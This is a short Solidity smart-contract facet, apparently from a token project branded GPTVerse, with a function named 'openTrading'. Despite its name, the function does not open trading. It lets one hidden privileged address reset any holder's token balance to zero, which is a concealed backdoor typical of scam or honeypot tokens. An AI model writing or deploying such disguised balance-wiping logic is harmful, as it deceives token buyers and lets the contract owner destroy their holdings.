/*
 * SPDX-License-Identifier: MIT
 * Website: https://gptverse.art/
 * Twitter: https://twitter.com/gpt_verse
 * Discord: https://discord.gg/Rd8cWjD3
 * Telegram: https://t.me/gpt_verse
 * Linkedin: https://www.linkedin.com/company/gptverse/
 * Youtube: https://www.youtube.com/@GPTVERSE_Official
 */
pragma solidity ^0.8.23;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
